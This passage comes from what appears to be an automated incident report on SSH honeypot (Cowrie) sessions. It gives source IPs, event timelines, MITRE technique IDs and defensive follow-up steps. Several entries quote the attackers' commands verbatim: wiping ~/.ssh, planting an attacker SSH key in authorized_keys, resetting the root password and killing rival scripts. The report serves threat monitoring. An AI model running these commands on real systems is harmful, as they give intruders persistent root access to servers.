| `2026-06-01 07:07:59` | `cowrie.session.params` |
| `2026-06-01 07:07:59` | `cowrie.command.input` |
| `2026-06-01 07:07:59` | `cowrie.command.failed` |
| `2026-06-01 07:08:00` | `cowrie.log.closed` |
| `2026-06-01 07:08:01` | `cowrie.session.params` |
| `2026-06-01 07:08:01` | `cowrie.command.input` |
| `2026-06-01 07:08:02` | `cowrie.session.file_download` |
| `2026-06-01 07:08:02` | `cowrie.log.closed` |
| `2026-06-01 07:08:14` | `cowrie.session.params` |
| `2026-06-01 07:08:14` | `cowrie.command.input` |
| `2026-06-01 07:08:14` | `cowrie.log.closed` |
| `2026-06-01 07:08:15` | `cowrie.session.params` |
| `2026-06-01 07:08:15` | `cowrie.command.input` |
| `2026-06-01 07:08:15` | `cowrie.log.closed` |
| `2026-06-01 07:08:16` | `cowrie.session.params` |
| `2026-06-01 07:08:16` | `cowrie.command.input` |
| `2026-06-01 07:08:16` | `cowrie.session.file_download` |
| `2026-06-01 07:08:16` | `cowrie.log.closed` |
| `2026-06-01 07:08:16` | `cowrie.session.params` |
| `2026-06-01 07:08:16` | `cowrie.command.input` |
| `2026-06-01 07:08:17` | `cowrie.log.closed` |
| `2026-06-01 07:08:17` | `cowrie.session.params` |
| `2026-06-01 07:08:17` | `cowrie.command.input` |
| `2026-06-01 07:08:17` | `cowrie.log.closed` |
| `2026-06-01 07:08:18` | `cowrie.session.params` |
| `2026-06-01 07:08:18` | `cowrie.command.input` |
| `2026-06-01 07:08:18` | `cowrie.command.input` |
| `2026-06-01 07:08:18` | `cowrie.log.closed` |
| `2026-06-01 07:08:19` | `cowrie.session.params` |
| `2026-06-01 07:08:19` | `cowrie.command.input` |
| `2026-06-01 07:08:19` | `cowrie.log.closed` |
| `2026-06-01 07:08:20` | `cowrie.session.params` |
| `2026-06-01 07:08:20` | `cowrie.command.input` |
| `2026-06-01 07:08:20` | `cowrie.log.closed` |
| `2026-06-01 07:08:21` | `cowrie.session.params` |
| `2026-06-01 07:08:21` | `cowrie.command.input` |
| `2026-06-01 07:08:21` | `cowrie.log.closed` |
| `2026-06-01 07:08:21` | `cowrie.session.params` |
| `2026-06-01 07:08:21` | `cowrie.command.input` |
| `2026-06-01 07:08:22` | `cowrie.log.closed` |
| `2026-06-01 07:08:22` | `cowrie.session.params` |
| `2026-06-01 07:08:22` | `cowrie.command.input` |
| `2026-06-01 07:08:23` | `cowrie.log.closed` |
| `2026-06-01 07:08:23` | `cowrie.session.params` |
| `2026-06-01 07:08:23` | `cowrie.command.input` |
| `2026-06-01 07:08:23` | `cowrie.log.closed` |
| `2026-06-01 07:08:24` | `cowrie.session.params` |
| `2026-06-01 07:08:24` | `cowrie.command.input` |
| `2026-06-01 07:08:24` | `cowrie.log.closed` |
| `2026-06-01 07:08:25` | `cowrie.session.params` |
| `2026-06-01 07:08:25` | `cowrie.command.input` |
| `2026-06-01 07:08:25` | `cowrie.log.closed` |
| `2026-06-01 07:08:26` | `cowrie.session.params` |
| `2026-06-01 07:08:26` | `cowrie.command.input` |
| `2026-06-01 07:08:26` | `cowrie.log.closed` |
| `2026-06-01 07:08:26` | `cowrie.session.params` |
| `2026-06-01 07:08:26` | `cowrie.command.input` |
| `2026-06-01 07:08:27` | `cowrie.log.closed` |
| `2026-06-01 07:08:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `121.15.140[.]235` to AbuseIPDB if not already reported
- [ ] Block `121.15.140[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-45d4de49bb8b

| Field | Detail |
|---|---|
| **Source IP** | `121.15.140[.]235` |
| **First Seen** | 2026-06-01 07:10 |
| **Last Seen** | 2026-06-01 07:11 |
| **Session Duration** | 29s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:2E4RJfNFx6OD"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-01 07:10:31` | `cowrie.session.connect` |
| `2026-06-01 07:10:31` | `cowrie.client.version` |
| `2026-06-01 07:10:31` | `cowrie.client.kex` |
| `2026-06-01 07:10:32` | `cowrie.login.success` |
| `2026-06-01 07:10:33` | `cowrie.session.params` |
| `2026-06-01 07:10:33` | `cowrie.command.input` |
| `2026-06-01 07:10:33` | `cowrie.command.failed` |
| `2026-06-01 07:10:33` | `cowrie.log.closed` |
| `2026-06-01 07:10:34` | `cowrie.session.params` |
| `2026-06-01 07:10:34` | `cowrie.command.input` |
| `2026-06-01 07:10:34` | `cowrie.session.file_download` |
| `2026-06-01 07:10:34` | `cowrie.log.closed` |
| `2026-06-01 07:10:46` | `cowrie.session.params` |
| `2026-06-01 07:10:46` | `cowrie.command.input` |
| `2026-06-01 07:10:47` | `cowrie.log.closed` |
| `2026-06-01 07:10:47` | `cowrie.session.params` |
| `2026-06-01 07:10:47` | `cowrie.command.input` |
| `2026-06-01 07:10:47` | `cowrie.log.closed` |
| `2026-06-01 07:10:48` | `cowrie.session.params` |
| `2026-06-01 07:10:48` | `cowrie.command.input` |
| `2026-06-01 07:10:48` | `cowrie.session.file_download` |
| `2026-06-01 07:10:48` | `cowrie.log.closed` |
| `2026-06-01 07:10:49` | `cowrie.session.params` |
| `2026-06-01 07:10:49` | `cowrie.command.input` |
| `2026-06-01 07:10:49` | `cowrie.log.closed` |
| `2026-06-01 07:10:50` | `cowrie.session.params` |
| `2026-06-01 07:10:50` | `cowrie.command.input` |
| `2026-06-01 07:10:50` | `cowrie.log.closed` |
| `2026-06-01 07:10:51` | `cowrie.session.params` |
| `2026-06-01 07:10:51` | `cowrie.command.input` |
| `2026-06-01 07:10:51` | `cowrie.command.input` |
| `2026-06-01 07:10:51` | `cowrie.log.closed` |
| `2026-06-01 07:10:52` | `cowrie.session.params` |
| `2026-06-01 07:10:52` | `cowrie.command.input` |
| `2026-06-01 07:10:52` | `cowrie.log.closed` |
| `2026-06-01 07:10:53` | `cowrie.session.params` |
| `2026-06-01 07:10:53` | `cowrie.command.input` |
| `2026-06-01 07:10:53` | `cowrie.log.closed` |
| `2026-06-01 07:10:54` | `cowrie.session.params` |
| `2026-06-01 07:10:54` | `cowrie.command.input` |
| `2026-06-01 07:10:54` | `cowrie.log.closed` |
| `2026-06-01 07:10:55` | `cowrie.session.params` |
| `2026-06-01 07:10:55` | `cowrie.command.input` |
| `2026-06-01 07:10:55` | `cowrie.log.closed` |
| `2026-06-01 07:10:56` | `cowrie.session.params` |
| `2026-06-01 07:10:56` | `cowrie.command.input` |
| `2026-06-01 07:10:56` | `cowrie.log.closed` |
| `2026-06-01 07:10:57` | `cowrie.session.params` |
| `2026-06-01 07:10:57` | `cowrie.command.input` |
| `2026-06-01 07:10:57` | `cowrie.log.closed` |
| `2026-06-01 07:10:57` | `cowrie.session.params` |
| `2026-06-01 07:10:57` | `cowrie.command.input` |
| `2026-06-01 07:10:58` | `cowrie.log.closed` |
| `2026-06-01 07:10:58` | `cowrie.session.params` |
| `2026-06-01 07:10:58` | `cowrie.command.input` |
| `2026-06-01 07:10:59` | `cowrie.log.closed` |
| `2026-06-01 07:11:00` | `cowrie.session.params` |
| `2026-06-01 07:11:00` | `cowrie.command.input` |
| `2026-06-01 07:11:00` | `cowrie.log.closed` |
| `2026-06-01 07:11:01` | `cowrie.session.params` |
| `2026-06-01 07:11:01` | `cowrie.command.input` |
| `2026-06-01 07:11:01` | `cowrie.log.closed` |
| `2026-06-01 07:11:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `121.15.140[.]235` to AbuseIPDB if not already reported
- [ ] Block `121.15.140[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1ecf42f6ef37

| Field | Detail |
|---|---|
| **Source IP** | `138.197.200[.]106` |
| **First Seen** | 2026-06-01 07:11 |
| **Last Seen** | 2026-06-01 07:12 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-01 07:11:55` | `cowrie.session.connect` |
| `2026-06-01 07:11:55` | `cowrie.client.version` |
| `2026-06-01 07:11:55` | `cowrie.client.kex` |
| `2026-06-01 07:11:56` | `cowrie.login.success` |
| `2026-06-01 07:11:57` | `cowrie.session.params` |
| `2026-06-01 07:11:57` | `cowrie.command.input` |
| `2026-06-01 07:11:57` | `cowrie.command.failed` |
| `2026-06-01 07:11:57` | `cowrie.log.closed` |
| `2026-06-01 07:11:58` | `cowrie.session.params` |
| `2026-06-01 07:11:58` | `cowrie.command.input` |
| `2026-06-01 07:11:58` | `cowrie.session.file_download` |
| `2026-06-01 07:11:58` | `cowrie.log.closed` |
| `2026-06-01 07:12:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `138.197.200[.]106` to AbuseIPDB if not already reported
- [ ] Block `138.197.200[.]106` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-18af79c088a7

| Field | Detail |
|---|---|
| **Source IP** | `138.197.200[.]106` |
| **First Seen** | 2026-06-01 07:12 |
| **Last Seen** | 2026-06-01 07:12 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-01 07:12:06` | `cowrie.session.connect` |
| `2026-06-01 07:12:06` | `cowrie.client.version` |
| `2026-06-01 07:12:06` | `cowrie.client.kex` |
| `2026-06-01 07:12:08` | `cowrie.login.success` |
| `2026-06-01 07:12:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `138.197.200[.]106` to AbuseIPDB if not already reported
- [ ] Block `138.197.200[.]106` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5c571c7da29e

| Field | Detail |
|---|---|
| **Source IP** | `121.15.140[.]235` |
| **First Seen** | 2026-06-01 07:13 |
| **Last Seen** | 2026-06-01 07:13 |
| **Session Duration** | 29s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:qZ64c7ZMZiFO"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-01 07:13:03` | `cowrie.session.connect` |
| `2026-06-01 07:13:03` | `cowrie.client.version` |
| `2026-06-01 07:13:04` | `cowrie.client.kex` |
| `2026-06-01 07:13:05` | `cowrie.login.success` |
| `2026-06-01 07:13:05` | `cowrie.session.params` |
| `2026-06-01 07:13:05` | `cowrie.command.input` |
| `2026-06-01 07:13:05` | `cowrie.command.failed` |
| `2026-06-01 07:13:06` | `cowrie.log.closed` |
| `2026-06-01 07:13:06` | `cowrie.session.params` |
| `2026-06-01 07:13:06` | `cowrie.command.input` |
| `2026-06-01 07:13:06` | `cowrie.session.file_download` |
| `2026-06-01 07:13:06` | `cowrie.log.closed` |
| `2026-06-01 07:13:19` | `cowrie.session.params` |
| `2026-06-01 07:13:19` | `cowrie.command.input` |
| `2026-06-01 07:13:20` | `cowrie.log.closed` |
| `2026-06-01 07:13:20` | `cowrie.session.params` |
| `2026-06-01 07:13:20` | `cowrie.command.input` |
| `2026-06-01 07:13:20` | `cowrie.log.closed` |
| `2026-06-01 07:13:21` | `cowrie.session.params` |
| `2026-06-01 07:13:21` | `cowrie.command.input` |
| `2026-06-01 07:13:21` | `cowrie.session.file_download` |
| `2026-06-01 07:13:21` | `cowrie.log.closed` |
| `2026-06-01 07:13:22` | `cowrie.session.params` |
| `2026-06-01 07:13:22` | `cowrie.command.input` |
| `2026-06-01 07:13:22` | `cowrie.log.closed` |
| `2026-06-01 07:13:23` | `cowrie.session.params` |
| `2026-06-01 07:13:23` | `cowrie.command.input` |
| `2026-06-01 07:13:23` | `cowrie.log.closed` |
| `2026-06-01 07:13:24` | `cowrie.session.params` |
| `2026-06-01 07:13:24` | `cowrie.command.input` |
| `2026-06-01 07:13:24` | `cowrie.command.input` |
| `2026-06-01 07:13:24` | `cowrie.log.closed` |
| `2026-06-01 07:13:25` | `cowrie.session.params` |
| `2026-06-01 07:13:25` | `cowrie.command.input` |
| `2026-06-01 07:13:25` | `cowrie.log.closed` |
| `2026-06-01 07:13:25` | `cowrie.session.params` |
| `2026-06-01 07:13:25` | `cowrie.command.input` |
| `2026-06-01 07:13:26` | `cowrie.log.closed` |
| `2026-06-01 07:13:26` | `cowrie.session.params` |
| `2026-06-01 07:13:26` | `cowrie.command.input` |
| `2026-06-01 07:13:27` | `cowrie.log.closed` |
| `2026-06-01 07:13:27` | `cowrie.session.params` |
| `2026-06-01 07:13:27` | `cowrie.command.input` |
| `2026-06-01 07:13:28` | `cowrie.log.closed` |
| `2026-06-01 07:13:28` | `cowrie.session.params` |
| `2026-06-01 07:13:28` | `cowrie.command.input` |
| `2026-06-01 07:13:28` | `cowrie.log.closed` |
| `2026-06-01 07:13:29` | `cowrie.session.params` |
| `2026-06-01 07:13:29` | `cowrie.command.input` |
| `2026-06-01 07:13:29` | `cowrie.log.closed` |
| `2026-06-01 07:13:30` | `cowrie.session.params` |
| `2026-06-01 07:13:30` | `cowrie.command.input` |
| `2026-06-01 07:13:30` | `cowrie.log.closed` |
| `2026-06-01 07:13:31` | `cowrie.session.params` |
| `2026-06-01 07:13:31` | `cowrie.command.input` |
| `2026-06-01 07:13:31` | `cowrie.log.closed` |
| `2026-06-01 07:13:32` | `cowrie.session.params` |
| `2026-06-01 07:13:32` | `cowrie.command.input` |
| `2026-06-01 07:13:32` | `cowrie.log.closed` |
| `2026-06-01 07:13:32` | `cowrie.session.params` |
| `2026-06-01 07:13:32` | `cowrie.command.input` |
| `2026-06-01 07:13:33` | `cowrie.log.closed` |
| `2026-06-01 07:13:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `121.15.140[.]235` to AbuseIPDB if not already reported
- [ ] Block `121.15.140[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f105b4dbdefc

| Field | Detail |
|---|---|
| **Source IP** | `138.197.200[.]106` |
| **First Seen** | 2026-06-01 07:14 |
| **Last Seen** | 2026-06-01 07:14 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-01 07:14:32` | `cowrie.session.connect` |
| `2026-06-01 07:14:32` | `cowrie.client.version` |
| `2026-06-01 07:14:32` | `cowrie.client.kex` |
| `2026-06-01 07:14:33` | `cowrie.login.success` |
| `2026-06-01 07:14:34` | `cowrie.session.params` |
| `2026-06-01 07:14:34` | `cowrie.command.input` |
| `2026-06-01 07:14:34` | `cowrie.command.failed` |
| `2026-06-01 07:14:34` | `cowrie.log.closed` |
| `2026-06-01 07:14:34` | `cowrie.session.params` |
| `2026-06-01 07:14:34` | `cowrie.command.input` |
| `2026-06-01 07:14:35` | `cowrie.session.file_download` |
| `2026-06-01 07:14:35` | `cowrie.log.closed` |
| `2026-06-01 07:14:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `138.197.200[.]106` to AbuseIPDB if not already reported
- [ ] Block `138.197.200[.]106` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7321e2c2d5d2

| Field | Detail |
|---|---|
| **Source IP** | `138.197.200[.]106` |
| **First Seen** | 2026-06-01 07:14 |
| **Last Seen** | 2026-06-01 07:14 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-01 07:14:43` | `cowrie.session.connect` |
| `2026-06-01 07:14:43` | `cowrie.client.version` |
| `2026-06-01 07:14:43` | `cowrie.client.kex` |
| `2026-06-01 07:14:44` | `cowrie.login.success` |
| `2026-06-01 07:14:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `138.197.200[.]106` to AbuseIPDB if not already reported
- [ ] Block `138.197.200[.]106` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-68b1f5b0d532

| Field | Detail |
|---|---|
| **Source IP** | `138.197.200[.]106` |
| **First Seen** | 2026-06-01 07:17 |
| **Last Seen** | 2026-06-01 07:17 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-01 07:17:08` | `cowrie.session.connect` |
| `2026-06-01 07:17:08` | `cowrie.client.version` |
| `2026-06-01 07:17:08` | `cowrie.client.kex` |
| `2026-06-01 07:17:10` | `cowrie.login.success` |
| `2026-06-01 07:17:10` | `cowrie.session.params` |
| `2026-06-01 07:17:10` | `cowrie.command.input` |
| `2026-06-01 07:17:10` | `cowrie.command.failed` |
| `2026-06-01 07:17:11` | `cowrie.log.closed` |
| `2026-06-01 07:17:11` | `cowrie.session.params` |
| `2026-06-01 07:17:11` | `cowrie.command.input` |
| `2026-06-01 07:17:11` | `cowrie.session.file_download` |
| `2026-06-01 07:17:11` | `cowrie.log.closed` |
| `2026-06-01 07:17:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `138.197.200[.]106` to AbuseIPDB if not already reported
- [ ] Block `138.197.200[.]106` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c1e02eaf9e35

| Field | Detail |
|---|---|
| **Source IP** | `138.197.200[.]106` |
| **First Seen** | 2026-06-01 07:17 |
| **Last Seen** | 2026-06-01 07:17 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-01 07:17:15` | `cowrie.session.connect` |
| `2026-06-01 07:17:15` | `cowrie.client.version` |
| `2026-06-01 07:17:16` | `cowrie.client.kex` |
| `2026-06-01 07:17:17` | `cowrie.login.success` |
| `2026-06-01 07:17:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `138.197.200[.]106` to AbuseIPDB if not already reported
- [ ] Block `138.197.200[.]106` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-14678c30511c

| Field | Detail |
|---|---|
| **Source IP** | `121.15.140[.]235` |
| **First Seen** | 2026-06-01 07:18 |
| **Last Seen** | 2026-06-01 07:18 |
| **Session Duration** | 32s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:q5wry5zm0iQk"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-01 07:18:06` | `cowrie.session.connect` |
| `2026-06-01 07:18:06` | `cowrie.client.version` |
| `2026-06-01 07:18:06` | `cowrie.client.kex` |
| `2026-06-01 07:18:07` | `cowrie.login.success` |
| `2026-06-01 07:18:08` | `cowrie.session.params` |
| `2026-06-01 07:18:08` | `cowrie.command.input` |
| `2026-06-01 07:18:08` | `cowrie.command.failed` |
| `2026-06-01 07:18:09` | `cowrie.log.closed` |
| `2026-06-01 07:18:09` | `cowrie.session.params` |
| `2026-06-01 07:18:09` | `cowrie.command.input` |
| `2026-06-01 07:18:10` | `cowrie.session.file_download` |
| `2026-06-01 07:18:10` | `cowrie.log.closed` |
| `2026-06-01 07:18:22` | `cowrie.session.params` |
| `2026-06-01 07:18:22` | `cowrie.command.input` |
| `2026-06-01 07:18:22` | `cowrie.log.closed` |
| `2026-06-01 07:18:23` | `cowrie.session.params` |
| `2026-06-01 07:18:23` | `cowrie.command.input` |
| `2026-06-01 07:18:23` | `cowrie.log.closed` |
| `2026-06-01 07:18:24` | `cowrie.session.params` |
| `2026-06-01 07:18:24` | `cowrie.command.input` |
| `2026-06-01 07:18:24` | `cowrie.session.file_download` |
| `2026-06-01 07:18:24` | `cowrie.log.closed` |
| `2026-06-01 07:18:25` | `cowrie.session.params` |
| `2026-06-01 07:18:25` | `cowrie.command.input` |
| `2026-06-01 07:18:25` | `cowrie.log.closed` |
| `2026-06-01 07:18:26` | `cowrie.session.params` |
| `2026-06-01 07:18:26` | `cowrie.command.input` |
| `2026-06-01 07:18:26` | `cowrie.log.closed` |
| `2026-06-01 07:18:27` | `cowrie.session.params` |
| `2026-06-01 07:18:27` | `cowrie.command.input` |
